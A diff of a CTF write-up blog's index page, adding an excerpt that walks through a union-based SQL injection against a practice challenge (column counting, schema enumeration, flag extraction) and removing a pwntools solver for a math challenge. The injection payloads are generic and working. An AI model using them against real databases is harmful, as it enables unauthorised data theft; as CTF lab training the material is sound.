@@ -131,6 +131,35 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/05/SWPUCTF2021-ezsql-wp/" >SWPUCTF2021-ezsql-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-05
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/387">题目链接</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&gt; ?wllm=1<span class="string">&#x27;	# 尝试看看是否为sql查询</span></span><br><span class="line"><span class="string">&lt; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1</span><br><span class="line"><span class="comment"># 说明确实为MariaDB sql查询且存在注入漏洞</span></span><br><span class="line"></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; order by 3--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:xxx</span></span><br><span class="line"><span class="string">  Your Password:yyy		# 正常</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> order by 4--+</span><br><span class="line">&lt; Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span>	<span class="comment"># 异常</span></span><br><span class="line"><span class="comment"># 说明读取列数为3，接着联合查询</span></span><br><span class="line"></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:xxx</span></span><br><span class="line"><span class="string">  Your Password:yyy		# 正常</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> union <span class="keyword">select</span> 1,2,3 <span class="built_in">limit</span> 1,1--+	<span class="comment"># 取第一行</span></span><br><span class="line">&lt; Your Login name:2</span><br><span class="line">  Your Password:3	<span class="comment"># 说明Loginname为第二字段 password为第三字段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取database名</span></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; union select 1,2,database() limit 1,1--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:2</span></span><br><span class="line"><span class="string">  Your Password:test_db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取tables</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> union <span class="keyword">select</span> 1,2,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;test_db&#x27;</span> <span class="built_in">limit</span> 1,1--+</span><br><span class="line">&lt; Your Login name:2</span><br><span class="line">  Your Password:test_tb,<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取columns</span></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27; limit 1,1--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:2</span></span><br><span class="line"><span class="string">  Your Password:id,flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取flag</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> union <span class="keyword">select</span> 1,2,flag from test_db.test_tb <span class="built_in">limit</span> 1,1--+</span><br><span class="line">&lt; Your Login name:2</span><br><span class="line">  Your Password:NSSCTF&#123;85fe17d6-6beb-479d-a957-c69fb83d8217&#125; </span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2023/07/05/SWPUCTF2021-ezsql-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/03/php-weakcmp/" >php弱类型绕过</a>
 								</h3>
 							</div>
@@ -468,35 +497,6 @@ else show_source(__FILE__);
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/13/GDOUCTF2023-easymath-wp/" >GDOUCTF2023-小学数学-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-13
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/GDOUCTF2023-easymath-wp">相关资源</a></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>查看server.py代码逻辑, 简单替换运算</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="number">28793</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;//&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%&#x27;</span>: <span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;%&#x27;</span>&#125;</span><br><span class="line">sla(<span class="string">b&#x27;start...&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">301</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Round&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    epr = ru(<span class="string">b&#x27;= &#x27;</span>)[:-<span class="number">3</span>].decode().split(<span class="string">&#x27; &#x27;</span>) <span class="comment">#空格分隔</span></span><br><span class="line">    epr[<span class="number">1</span>] = d[epr[<span class="number">1</span>]] <span class="comment"># 替换运算符</span></span><br><span class="line">    epr = <span class="string">&#x27;&#x27;</span>.join(epr)</span><br><span class="line">    <span class="built_in">print</span>(epr)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">eval</span>(epr)).encode())</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2023/06/13/GDOUCTF2023-easymath-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -556,7 +556,7 @@ else show_source(__FILE__);
 		
 			<li><a href="/categories/web-learning/">web-learning<span>1</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>13</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>14</span></a></li>
 		
 		</ul>
 	</div>
@@ -567,45 +567,45 @@ else show_source(__FILE__);
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>4</span></a></li>
 		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/heap/">heap<span>2</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>2</span></a></li>
-		
-			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/web/">web<span>14</span></a></li>
-		
-			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
-		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>3</span></a></li>
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
 			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
 		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
-		
-			<li><a href="/tags/nssctf/">nssctf<span>21</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>9</span></a></li>
+			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
 		
 			<li><a href="/tags/php/">php<span>10</span></a></li>
 		
-			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
+			<li><a href="/tags/rce/">rce<span>1</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
+		
+			<li><a href="/tags/nssctf/">nssctf<span>22</span></a></li>
+		
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/stack/">stack<span>2</span></a></li>
+		
+			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
+		
+			<li><a href="/tags/include/">include<span>1</span></a></li>
+		
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
+		
+			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
+		
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li>
+		
+			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>30</span></a></li>
@@ -621,6 +621,10 @@ else show_source(__FILE__);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/07/12/第五空间2021-yasqlin-wp/" ><i class="fa fa-file-o"></i>第五空间2021-yet_another_mysql_...</a>
+      </li>
+    
+      <li>
         <a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2022-ezsql-wp</a>
       </li>
     
@@ -634,10 +638,6 @@ else show_source(__FILE__);
     
       <li>
         <a href="/2023/07/09/SWPUCTF2021-pop-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2021-pop-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/07/08/赣网杯2021-web1-wp/" ><i class="fa fa-file-o"></i>赣网杯2021-web1-wp</a>
       </li>
     
   </ul>
